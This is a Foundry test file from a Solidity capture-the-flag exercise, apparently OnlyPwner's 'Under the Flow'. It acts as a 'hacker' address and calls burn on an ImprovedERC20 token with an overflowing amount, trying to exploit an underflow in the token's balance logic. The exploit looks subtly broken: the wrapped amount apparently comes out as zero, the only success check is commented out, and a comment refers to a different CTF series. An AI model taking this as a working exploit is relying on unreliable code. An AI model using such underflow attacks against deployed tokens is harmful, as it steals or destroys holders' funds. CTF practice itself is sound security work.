// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "@dev/forge-std/Test.sol";
import { console2 } from "@dev/forge-std/console2.sol";
import { ImprovedERC20 } from "@contracts/CTF/ONLYPWNER/04.UNDER-THE-FLOW.sol";

/*
    forge test --match-path foundry/test/CTF/ONLYPWNER/04.UNDER-THE-FLOW.t.sol -vvvv
*/

contract UNDER_THE_FLOW_04_Test is Test {
    // hacking attack address
    address private hacker = address(1);
    address private other = address(2);
    ImprovedERC20 private erc20;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        _before();
        // Deal attack address some ether
        vm.deal(hacker, 5 ether);
    }

    function _before() public {
        // 1.SetUp the exploit
        erc20 = new ImprovedERC20("Improved ERC20", "IMPERC20", 18, 100 ether);

        erc20.transfer(other, 100 ether);
    }

    function test_Exploit() public {
        vm.startPrank(hacker);
        // 2.Run the exploit
        console2.log("owner()", erc20.owner());
        unchecked {
            erc20.burn(hacker, type(uint256).max + 1);
        }
        // 3.Verify the exploit
        _after();
    }

    function _after() public {
        vm.stopPrank();
        // require(erc20.balanceOf(address(hacker)) > 0, "Not solved: Attacker not have token");
    }
}
